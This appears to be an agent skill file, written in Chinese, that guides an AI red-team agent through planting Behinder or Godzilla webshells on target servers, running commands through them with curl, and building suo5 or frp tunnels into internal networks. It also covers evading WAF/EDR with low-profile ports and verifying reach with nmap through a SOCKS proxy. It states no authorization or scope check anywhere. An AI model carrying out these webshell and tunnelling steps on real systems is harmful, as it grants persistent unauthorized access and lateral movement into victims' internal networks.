---
name: webshell-toolkit
description: WebShell 与隧道：冰蝎/哥斯拉马投放与实测、suo5/frp 建隧道并验证内网可达
tags: exploit, webshell, tunnel
---

# WebShell 与隧道

> 判定标准只有一条：**用户能连上才算入口，隧道能访问到内网目标才算打通**。
> 自己 VPS 上开的代理不算隧道（必须写清目标侧入口 `entry_kind`）。

## 1. 拿服务器权限

拿到可写点后优先：

| 类型 | 适用 | 注意 |
|---|---|---|
| 冰蝎（Behinder） | Java 目标，AES 加密流量 | 需对应版本马 + 相同密钥 |
| 哥斯拉（Godzilla） | Java/C# 目标，支持多种加密器 | 生成时记录 payload 类型与密钥 |
| 一句话/其他 | 简单回显场景 | 易被 WAF 拦，优先加密马 |

投放后**必须实测**：

```bash
# 连上并执行无害命令验证
curl -s -X POST '<webshell-url>' --data 'pass=<pwd>&cmd=whoami'
```

连不上 → 判定未成功，不要记为入口。

落库：

```
redteam_webshell_add({ assetId, url, type })
```

## 2. 建隧道（suo5 / frp）

### suo5（HTTP 隧道，穿透性好）

```bash
# 目标侧上传 suo5 后启动（示例，按目标平台调整）
./suo5 -l 0.0.0.0:8080

# 本地起客户端
./suo5 -c <目标地址> -l 127.0.0.1:1080
```

### frp（需 VPS）

```bash
# VPS：frps
./frps -c frps.ini

# 目标：frpc（注意用低特征端口）
./frpc -c frpc.ini    # 指向 <VPS_IP>:<port>
```

## 3. 验证隧道（不许跳过）

```bash
# HTTP 代理验证
curl -x socks5://127.0.0.1:1080 http://<内网IP>/ -m 5 -i

# 或确认能拿到内网服务指纹
nmap -sT -Pn -p 80,443,3389 <内网IP> --proxies socks4://127.0.0.1:1080
```

拿到响应 → 记录**可达网段**；拿不到 → 隧道未打通。

落库：

```
redteam_tunnel_add({ entryKind: 'webshell|suo5|frp', listen: 'socks5://127.0.0.1:1080', reachable: '10.0.0.0/8' })
```

## 4. 判定标准

- [ ] webshell 用 curl 实测返回了命令输出
- [ ] 隧道用代理实测访问到内网 HTTP/RDP 等服务
- [ ] `entry_kind` 写的是**目标侧**入口，不是自己的 VPS
- [ ] 给用户的配置可直接粘贴：`socks5://127.0.0.1:<端口>`

## 常见坑

| 坑 | 处理 |
|---|---|
| 马传上去没测连通 → 假入口 | 必须 curl 验证 |
| 隧道建好没测内网 → 假打通 | 必须用代理访问真实内网目标 |
| 端口被 WAF/EDR 拦 | 换 80/443 复用，或用 suo5 |
| 密钥/密码丢了 | 生成时立刻记到 `redteam_credential_add`（脱敏） |
